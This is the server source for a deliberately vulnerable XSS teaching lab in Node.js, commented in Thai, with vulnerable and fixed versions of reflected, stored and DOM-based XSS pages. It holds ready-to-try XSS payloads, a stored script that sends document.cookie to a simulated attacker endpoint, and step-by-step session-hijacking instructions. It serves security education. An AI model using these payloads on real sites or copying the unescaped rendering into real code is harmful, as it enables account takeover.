// =====================================================================
//  XSS Lab — เว็บที่ "ตั้งใจ" ให้มีช่องโหว่ XSS เพื่อการเรียนรู้
//  ⚠ ห้ามเอาไปรันบนเซิร์ฟเวอร์จริง / ห้ามเปิดให้คนอื่นเข้าถึง
//  รันแค่บนเครื่องตัวเอง (127.0.0.1) เท่านั้น
//
//  ไม่ต้องติดตั้งอะไรเพิ่ม ใช้แค่ Node.js:  node server.js
// =====================================================================

const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const HOST = '127.0.0.1'; // ฟังเฉพาะเครื่องตัวเอง คนอื่นในเน็ตเวิร์กเข้าไม่ได้
const PORT = Number(process.env.PORT) || 3000;

// ---------------------------------------------------------------------
// ข้อมูลในหน่วยความจำ (ปิดเซิร์ฟเวอร์แล้วหายหมด)
// ---------------------------------------------------------------------
const comments = [{ name: 'Admin', text: 'ยินดีต้อนรับสู่สมุดเยี่ยม! ฝากข้อความไว้ได้เลย' }];
const stolen = []; // ข้อมูลที่ "แฮกเกอร์" ขโมยมาได้ (ใช้ในหน้า /attacker)

// บัญชีผู้ใช้จำลอง (รหัสผ่านเป็น plain text เพื่อความง่ายของแล็บ ห้ามทำแบบนี้จริง)
const users = {
  admin:   { password: 'admin123',   role: 'ผู้ดูแลระบบ', secret: 'โค้ดลับของแอดมิน: ADMIN-FLAG-9981' },
  somchai: { password: 'somchai123', role: 'สมาชิกทั่วไป', secret: 'ข้อมูลส่วนตัวของสมชาย' },
  guest:   { password: null,         role: 'ผู้มาเยือน (ยังไม่ได้ล็อกอิน)', secret: 'ต้องล็อกอินก่อนถึงจะเห็นข้อมูลลับ' },
};

// session id -> ชื่อผู้ใช้
const sessions = new Map();
sessions.set('demo-user-1234', 'guest'); // session เริ่มต้นแบบ guest ให้มีคุกกี้ไว้เสมอ

function newSessionId() {
  return crypto.randomBytes(8).toString('hex');
}
function parseCookies(req) {
  const out = {};
  (req.headers.cookie || '').split(';').forEach((kv) => {
    const i = kv.indexOf('=');
    if (i > -1) out[kv.slice(0, i).trim()] = decodeURIComponent(kv.slice(i + 1).trim());
  });
  return out;
}
// คืนชื่อผู้ใช้ปัจจุบันจากคุกกี้ session
function currentUser(req) {
  const sid = parseCookies(req).session;
  const name = sessions.get(sid);
  return name && users[name] ? { name, sid, ...users[name] } : null;
}

// ---------------------------------------------------------------------
// ✅ ฟังก์ชันหัวใจของการป้องกัน: แปลงอักขระพิเศษให้เป็นข้อความธรรมดา
//    <  กลายเป็น &lt;   เบราว์เซอร์จะ "แสดง" < แต่ไม่ "ตีความ" เป็นแท็ก
// ---------------------------------------------------------------------
function escapeHtml(value) {
  return String(value).replace(/[&<>"']/g, (ch) => ({
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#39;',
  })[ch]);
}

// ---------------------------------------------------------------------
// โครงหน้าเว็บ
// ---------------------------------------------------------------------
function page(title, body, mode, req) {
  const badge =
    mode === 'vuln' ? '<span class="badge vuln">⚠ VULNERABLE</span>' :
    mode === 'safe' ? '<span class="badge safe">✔ SAFE</span>' : '';
  const user = req ? currentUser(req) : null;
  const who = user
    ? `ล็อกอินเป็น <b>${escapeHtml(user.name)}</b> · <a href="/account">บัญชีของฉัน</a> · <a href="/logout">ออกจากระบบ</a>`
    : `<a href="/login">เข้าสู่ระบบ</a>`;
  return `<!doctype html>
<html lang="th">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>${title} · XSS Lab</title>
  <link rel="stylesheet" href="/static/style.css">
</head>
<body>
  <header><a href="/" class="logo">XSS Lab</a>${badge}<span class="who">${who}</span></header>
  <main>${body}</main>
  <footer>สำหรับการเรียนรู้บนเครื่องตัวเองเท่านั้น · Anti-hacking matters</footer>
</body>
</html>`;
}

// รายการ payload ให้กดลองได้ทันที (ตัว payload ถูก escape ก่อนแสดง)
function payloadList(items) {
  return `<details open><summary>ลอง payload เหล่านี้</summary><ul class="payloads">${items
    .map((p) => `<li><a href="${escapeHtml(p.href)}">ลอง</a> <code>${escapeHtml(p.text)}</code>${p.note ? ` <small>${p.note}</small>` : ''}</li>`)
    .join('')}</ul></details>`;
}

// ---------------------------------------------------------------------
// การส่ง response
// ---------------------------------------------------------------------
function send(res, status, html, { safe = false, setSession = null } = {}) {
  const cookies = [
    // session        -> ไม่มี HttpOnly  : JavaScript อ่านได้ (ขโมยได้ถ้าโดน XSS)
    // secret_session -> มี HttpOnly     : JavaScript อ่านไม่ได้
    'secret_session=httponly-5678; Path=/; HttpOnly; SameSite=Lax',
  ];
  if (setSession) cookies.push(`session=${setSession}; Path=/; SameSite=Lax`);

  const headers = {
    'Content-Type': 'text/html; charset=utf-8',
    'Set-Cookie': cookies,
  };
  if (safe) {
    // ✅ ชั้นป้องกันที่ 2: Content Security Policy
    headers['Content-Security-Policy'] =
      "default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self'; object-src 'none'; base-uri 'none'; form-action 'self'";
    headers['X-Content-Type-Options'] = 'nosniff';
  }
  res.writeHead(status, headers);
  res.end(html);
}

function redirect(res, location, cookie) {
  const headers = { Location: location };
  if (cookie) headers['Set-Cookie'] = cookie;
  res.writeHead(303, headers);
  res.end();
}

function readForm(req) {
  return new Promise((resolve, reject) => {
    let data = '';
    req.on('data', (chunk) => {
      data += chunk;
      if (data.length > 100_000) {
        req.destroy();
        reject(new Error('body too large'));
      }
    });
    req.on('end', () => resolve(new URLSearchParams(data)));
    req.on('error', reject);
  });
}

// ไฟล์ static (กำหนดรายชื่อไว้ตายตัว กัน path traversal)
const STATIC = {
  '/static/style.css': ['style.css', 'text/css; charset=utf-8'],
  '/static/dom-vuln.js': ['dom-vuln.js', 'text/javascript; charset=utf-8'],
  '/static/dom-safe.js': ['dom-safe.js', 'text/javascript; charset=utf-8'],
};

// ให้ทุก response ที่ยังไม่มี session คุกกี้ ได้ session guest ไปก่อน
function ensureSession(req) {
  const sid = parseCookies(req).session;
  if (sid && sessions.has(sid)) return null; // มีแล้ว ไม่ต้องตั้งใหม่
  return 'demo-user-1234'; // ตั้ง guest
}

// =====================================================================
// หน้าแรก
// =====================================================================
function homePage(req) {
  return page('หน้าแรก', `
    <h1>XSS Lab 🧪</h1>
    <p>แล็บฝึกทำความเข้าใจ <b>Cross-Site Scripting (XSS)</b> มี 3 แบบ แต่ละแบบมีหน้า
       <span class="badge vuln">VULNERABLE</span> ให้ลองโจมตี และหน้า
       <span class="badge safe">SAFE</span> ที่แก้แล้วให้เทียบกัน</p>

    <table>
      <tr><th>Lab</th><th>ชนิด</th><th>มีช่องโหว่</th><th>แก้แล้ว</th></tr>
      <tr><td>1</td><td>Reflected XSS — ช่องค้นหา</td>
          <td><a href="/search">/search</a></td><td><a href="/safe/search">/safe/search</a></td></tr>
      <tr><td>2</td><td>Stored XSS — สมุดเยี่ยม</td>
          <td><a href="/guestbook">/guestbook</a></td><td><a href="/safe/guestbook">/safe/guestbook</a></td></tr>
      <tr><td>3</td><td>DOM-based XSS — ทักทายจาก URL</td>
          <td><a href="/dom#สมชาย">/dom</a></td><td><a href="/safe/dom#สมชาย">/safe/dom</a></td></tr>
    </table>

    <h2>🎯 เดโมเต็ม: ขโมย session แล้วสวมรอยเป็นเหยื่อ</h2>
    <p>นี่คือจุดที่ทำให้เห็นว่า XSS อันตรายจริง มี 2 บัญชีให้ลอง: <code>admin</code> / <code>somchai</code></p>
    <ol>
      <li><a href="/login">เข้าสู่ระบบ</a> เป็น <b>admin</b> (รหัส <code>admin123</code>) — นี่คือ "เหยื่อ"</li>
      <li>ไปโพสต์ payload ขโมยคุกกี้ที่ <a href="/guestbook">Stored XSS</a> (ข้อ 3)</li>
      <li>ดู session ที่ขโมยได้ที่ <a href="/attacker">/attacker</a> แล้วทำตามขั้นตอน "สวมรอย"</li>
    </ol>

    <h2>คุกกี้ในเบราว์เซอร์ตอนนี้</h2>
    <p>เว็บนี้ตั้งคุกกี้ไว้ 2 ตัว: <code>session</code> (ไม่มี HttpOnly) และ
       <code>secret_session</code> (มี HttpOnly) ลองดูว่า XSS ขโมยตัวไหนได้บ้าง</p>
  `, null, req);
}

// =====================================================================
// ล็อกอิน / ออกจากระบบ / หน้าบัญชี (สำหรับเดโมขโมย session)
// =====================================================================
function loginPage(req, msg) {
  const user = currentUser(req);
  return page('เข้าสู่ระบบ', `
    <h1>เข้าสู่ระบบ</h1>
    ${user && user.name !== 'guest' ? `<p class="result">ตอนนี้ล็อกอินเป็น <b>${escapeHtml(user.name)}</b> อยู่แล้ว · <a href="/account">ไปหน้าบัญชี</a></p>` : ''}
    ${msg ? `<p class="result" style="color:var(--red)">${escapeHtml(msg)}</p>` : ''}
    <form method="post" action="/login" class="stack">
      <input name="username" placeholder="ชื่อผู้ใช้ (admin หรือ somchai)" required>
      <input name="password" type="password" placeholder="รหัสผ่าน" required>
      <button>เข้าสู่ระบบ</button>
    </form>
    <details><summary>บัญชีทดสอบ</summary>
      <ul><li><code>admin</code> / <code>admin123</code></li><li><code>somchai</code> / <code>somchai123</code></li></ul>
    </details>
  `, null, req);
}

function accountPage(req) {
  const user = currentUser(req);
  const name = user ? user.name : 'guest';
  const info = user || users.guest;
  return page('บัญชีของฉัน', `
    <h1>บัญชีของฉัน</h1>
    <div class="result">
      <p>คุณกำลังเข้าใช้งานในชื่อ: <b>${escapeHtml(name)}</b></p>
      <p>สิทธิ์: ${escapeHtml(info.role)}</p>
      <p>🔒 ข้อมูลลับเฉพาะเจ้าของบัญชี: <b>${escapeHtml(info.secret)}</b></p>
      <p>session id ปัจจุบัน: <code>${escapeHtml(user ? user.sid : parseCookies(req).session || '-')}</code></p>
    </div>
    <p class="switch">หน้านี้ตัดสินว่าคุณเป็นใคร <b>จากคุกกี้ session เท่านั้น</b> —
       ใครก็ตามที่มีคุกกี้ session ของ admin ก็จะกลายเป็น admin ที่หน้านี้ทันที</p>
    ${name === 'guest' ? '<p><a href="/login">เข้าสู่ระบบ</a></p>' : '<p><a href="/logout">ออกจากระบบ</a></p>'}
  `, null, req);
}

// =====================================================================
// Lab 1: Reflected XSS
// =====================================================================
const reflectedPayloads = [
  { text: `<script>alert('XSS')</script>`, note: 'แบบคลาสสิก' },
  { text: `<img src=x onerror="alert(document.cookie)">`, note: 'ใช้ event ของรูปภาพ + อ่านคุกกี้' },
  { text: `"><svg onload=alert('หลุดจาก attribute')>`, note: 'หลุดออกจาก value="..." ของช่อง input' },
  { text: `" autofocus onfocus="alert('attr')`, note: 'ไม่ต้องใช้ < > เลย ฝัง event ใน attribute' },
];

function searchPage(req, q, safe) {
  const base = safe ? '/safe/search' : '/search';
  const out = safe ? escapeHtml(q) : q; // ❌ vuln: q ตรงๆ  ✅ safe: escape

  return page('Reflected XSS', `
    <h1>Lab 1: Reflected XSS</h1>
    <p>ร้านค้าออนไลน์ที่มีช่องค้นหา คำที่พิมพ์จะถูกส่งไปใน URL แล้วเซิร์ฟเวอร์ใส่กลับมาในหน้าเว็บ</p>

    <form action="${base}" method="get">
      <input name="q" value="${out}" placeholder="ค้นหาสินค้า...">
      <button>ค้นหา</button>
    </form>

    ${q ? `<div class="result">ผลการค้นหาสำหรับ: <b>${out}</b><br>ไม่พบสินค้าที่ตรงกัน</div>` : ''}

    ${payloadList(reflectedPayloads.map((p) => ({ ...p, href: `${base}?q=${encodeURIComponent(p.text)}` })))}

    <p class="switch">${safe
      ? 'ดูแบบมีช่องโหว่: <a href="/search">/search</a>'
      : 'ดูแบบแก้แล้ว: <a href="/safe/search">/safe/search</a>'}</p>
  `, safe ? 'safe' : 'vuln', req);
}

// =====================================================================
// Lab 2: Stored XSS
// =====================================================================
const storedPayloads = [
  { text: `<script>alert('Stored XSS!')</script>`, note: 'ทุกคนที่เปิดหน้านี้จะโดน' },
  { text: `<img src=x onerror="alert(document.cookie)">`, note: 'อ่านคุกกี้' },
  {
    text: `<script>new Image().src='/attacker/collect?c='+encodeURIComponent(document.cookie)</script>`,
    note: 'ส่งคุกกี้ไปให้แฮกเกอร์แบบเงียบๆ แล้วไปดูที่ <a href="/attacker">/attacker</a>',
  },
  { text: `<h1 style="color:red">เว็บนี้ถูกแฮก!</h1>`, note: 'ไม่ใช่สคริปต์ แต่แก้หน้าตาเว็บได้ (defacement)' },
];

function guestbookPage(req, safe) {
  const base = safe ? '/safe/guestbook' : '/guestbook';
  const show = safe ? escapeHtml : (s) => s; // ❌ vuln: แสดงตรงๆ  ✅ safe: escape

  const list = comments
    .map((c) => `<div class="comment"><b>${show(c.name)}</b><div>${show(c.text)}</div></div>`)
    .join('');

  return page('Stored XSS', `
    <h1>Lab 2: Stored XSS</h1>
    <p>สมุดเยี่ยม ข้อความที่โพสต์จะถูกเก็บในเซิร์ฟเวอร์และแสดงให้ <b>ทุกคน</b> ที่เข้ามาเห็น</p>

    <form method="post" action="${base}" class="stack">
      <input name="name" placeholder="ชื่อ" maxlength="100" required>
      <textarea name="text" placeholder="ข้อความ (ลองวาง payload ด้านล่าง)" rows="3" maxlength="2000" required></textarea>
      <button>โพสต์</button>
    </form>

    <h2>ข้อความทั้งหมด (${comments.length})</h2>
    ${list}

    <form method="post" action="/guestbook/reset">
      <input type="hidden" name="back" value="${base}">
      <button class="secondary">ล้างข้อความทั้งหมด</button>
    </form>

    <details open><summary>ลอง payload เหล่านี้ (คัดลอกไปวางในช่องข้อความ)</summary>
      <ul class="payloads">${storedPayloads
        .map((p) => `<li><code>${escapeHtml(p.text)}</code> <small>${p.note}</small></li>`)
        .join('')}</ul>
    </details>

    <p class="switch">${safe
      ? 'ดูข้อความชุดเดียวกันในหน้ามีช่องโหว่: <a href="/guestbook">/guestbook</a>'
      : 'ดูข้อความชุดเดียวกันในหน้าแก้แล้ว: <a href="/safe/guestbook">/safe/guestbook</a>'}</p>
  `, safe ? 'safe' : 'vuln', req);
}

// =====================================================================
// Lab 3: DOM-based XSS
// =====================================================================
const domPayloads = [
  { text: `<img src=x onerror="alert(document.cookie)">`, note: 'ได้ผล' },
  { text: `<script>alert(1)</script>`, note: 'ไม่ได้ผล! innerHTML ไม่รัน &lt;script&gt; (แต่ไม่ได้แปลว่าปลอดภัย)' },
  { text: `<iframe src="javascript:alert('iframe')">`, note: 'ได้ผล' },
];

function domPage(req, safe) {
  const base = safe ? '/safe/dom' : '/dom';
  return page('DOM-based XSS', `
    <h1>Lab 3: DOM-based XSS</h1>
    <p>หน้านี้ทักทายด้วยชื่อที่อยู่หลังเครื่องหมาย <code>#</code> ใน URL เช่น <code>${base}#สมชาย</code><br>
       ข้อสังเกต: ส่วนหลัง <code>#</code> <b>ไม่ถูกส่งไปที่เซิร์ฟเวอร์</b> เลย ทุกอย่างเกิดในเบราว์เซอร์</p>

    <div id="greeting" class="result"></div>

    ${payloadList(domPayloads.map((p) => ({ ...p, href: `${base}#${encodeURIComponent(p.text)}` })))}

    <p class="switch">${safe
      ? 'ดูแบบมีช่องโหว่: <a href="/dom#สมชาย">/dom</a>'
      : 'ดูแบบแก้แล้ว: <a href="/safe/dom#สมชาย">/safe/dom</a>'}</p>

    <script src="/static/${safe ? 'dom-safe.js' : 'dom-vuln.js'}"></script>
  `, safe ? 'safe' : 'vuln', req);
}

// =====================================================================
// หน้าของแฮกเกอร์ (จำลอง)
// =====================================================================
function attackerPage(req) {
  const rows = stolen
    .map((s, i) => `<tr><td>${escapeHtml(s.time)}</td><td><code class="cookie">${escapeHtml(s.data)}</code></td><td>${escapeHtml(s.from)}</td></tr>`)
    .join('');
  // ดึงค่า session= จากรายการล่าสุด เพื่อโชว์ในขั้นตอนสวมรอย
  const latest = stolen[0]?.data || '';
  const m = latest.match(/session=([0-9a-zA-Z._-]+)/);
  const sid = m ? m[1] : 'ยังไม่มี';

  return page('Attacker', `
    <h1>🕵️ เซิร์ฟเวอร์ของแฮกเกอร์ (จำลอง)</h1>
    <p>เมื่อเหยื่อเปิดหน้าที่มี payload ขโมยคุกกี้ เบราว์เซอร์ของเหยื่อจะส่งข้อมูลมาที่
       <code>/attacker/collect?c=...</code> และมาแสดงที่นี่</p>
    <p>สังเกตว่าได้แค่ <code>session</code> แต่ <b>ไม่ได้</b> <code>secret_session</code> เพราะตัวนั้นเป็น HttpOnly</p>
    ${stolen.length
      ? `<table><tr><th>เวลา</th><th>ข้อมูลที่ได้</th><th>มาจากหน้า</th></tr>${rows}</table>`
      : '<p class="result">ยังไม่มีข้อมูล — ล็อกอินเป็น admin ก่อน แล้วไปโพสต์ payload ข้อ 3 ใน <a href="/guestbook">Stored XSS</a></p>'}

    <h2>🎭 ขั้นตอน "สวมรอย" เป็นเหยื่อ (session hijacking)</h2>
    <p>session ของเหยื่อที่ขโมยได้ล่าสุดคือ: <code>session=${escapeHtml(sid)}</code></p>
    <ol>
      <li>เปิดหน้าต่าง <b>ไม่ระบุตัวตน (Incognito)</b> — สมมติว่านี่คือเบราว์เซอร์ของแฮกเกอร์ที่ไม่ได้ล็อกอิน</li>
      <li>เข้า <code>http://localhost:${PORT}/account</code> จะเห็นว่าเป็น <b>guest</b></li>
      <li>เปิด DevTools (F12) → <b>Application</b> → <b>Cookies</b> → <code>http://localhost:${PORT}</code></li>
      <li>แก้ค่าคุกกี้ <code>session</code> ให้เป็น <code>${escapeHtml(sid)}</code> แล้วรีเฟรชหน้า <code>/account</code></li>
      <li>หน้าจะกลายเป็น <b>admin</b> ทันที — เข้าบัญชีเหยื่อได้โดยไม่ต้องรู้รหัสผ่าน</li>
    </ol>
    <p>นี่คือเหตุผลที่คุกกี้ session ควรเป็น <b>HttpOnly</b> (กัน JS อ่าน) และควรมี CSP กัน XSS ตั้งแต่แรก</p>

    <form method="post" action="/attacker/clear"><button class="secondary">ล้างข้อมูล</button></form>
  `, null, req);
}

// =====================================================================
// Router
// =====================================================================
const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, `http://${req.headers.host || HOST}`);
  const p = url.pathname;
  const setSession = ensureSession(req); // ตั้ง guest ถ้ายังไม่มี

  try {
    if (req.method === 'GET' && STATIC[p]) {
      const [file, type] = STATIC[p];
      res.writeHead(200, { 'Content-Type': type });
      return res.end(fs.readFileSync(path.join(__dirname, 'public', file)));
    }

    if (req.method === 'GET') {
      switch (p) {
        case '/': return send(res, 200, homePage(req), { setSession });
        case '/login': return send(res, 200, loginPage(req), { setSession });
        case '/logout': return redirect(res, '/login', 'session=demo-user-1234; Path=/; SameSite=Lax');
        case '/account': return send(res, 200, accountPage(req), { setSession });
        case '/search': return send(res, 200, searchPage(req, url.searchParams.get('q') || '', false), { setSession });
        case '/safe/search': return send(res, 200, searchPage(req, url.searchParams.get('q') || '', true), { safe: true, setSession });
        case '/guestbook': return send(res, 200, guestbookPage(req, false), { setSession });
        case '/safe/guestbook': return send(res, 200, guestbookPage(req, true), { safe: true, setSession });
        case '/dom': return send(res, 200, domPage(req, false), { setSession });
        case '/safe/dom': return send(res, 200, domPage(req, true), { safe: true, setSession });
        case '/attacker': return send(res, 200, attackerPage(req), { setSession });
        case '/attacker/collect': {
          const data = url.searchParams.get('c') || '';
          const entry = {
            time: new Date().toLocaleTimeString('th-TH'),
            data,
            from: req.headers.referer || '-',
          };
          stolen.unshift(entry);
          stolen.length = Math.min(stolen.length, 50);
          console.log(`\x1b[31m[ATTACKER] ได้คุกกี้: ${data}\x1b[0m  (จาก ${entry.from})`);
          res.writeHead(204);
          return res.end();
        }
      }
    }

    if (req.method === 'POST') {
      const form = await readForm(req);
      switch (p) {
        case '/login': {
          const username = (form.get('username') || '').trim();
          const password = form.get('password') || '';
          const u = users[username];
          if (u && u.password && password === u.password) {
            const sid = newSessionId();
            sessions.set(sid, username);
            return redirect(res, '/account', `session=${sid}; Path=/; SameSite=Lax`);
          }
          return send(res, 200, loginPage(req, 'ชื่อผู้ใช้หรือรหัสผ่านไม่ถูกต้อง'));
        }
        case '/guestbook':
        case '/safe/guestbook': {
          const name = (form.get('name') || 'ไม่ระบุชื่อ').slice(0, 100);
          const text = (form.get('text') || '').slice(0, 2000);
          if (text) {
            comments.push({ name, text });
            if (comments.length > 50) comments.shift();
          }
          return redirect(res, p);
        }
        case '/guestbook/reset': {
          comments.length = 0;
          comments.push({ name: 'Admin', text: 'ยินดีต้อนรับสู่สมุดเยี่ยม! ฝากข้อความไว้ได้เลย' });
          const back = form.get('back') === '/safe/guestbook' ? '/safe/guestbook' : '/guestbook';
          return redirect(res, back);
        }
        case '/attacker/clear':
          stolen.length = 0;
          return redirect(res, '/attacker');
      }
    }

    send(res, 404, page('ไม่พบหน้า', '<h1>404</h1><p>ไม่พบหน้านี้ <a href="/">กลับหน้าแรก</a></p>', null, req), { setSession });
  } catch (err) {
    console.error(err);
    if (!res.headersSent) send(res, 500, page('Error', '<h1>500</h1><p>เกิดข้อผิดพลาด</p>'));
  }
});

server.listen(PORT, HOST, () => {
  console.log('');
  console.log('  \x1b[33m⚠  XSS Lab — เว็บนี้ตั้งใจให้มีช่องโหว่ ใช้เรียนรู้บนเครื่องตัวเองเท่านั้น\x1b[0m');
  console.log(`  เปิดเบราว์เซอร์ไปที่:  \x1b[36mhttp://localhost:${PORT}\x1b[0m`);
  console.log('  กด Ctrl+C เพื่อปิด');
  console.log('');
});
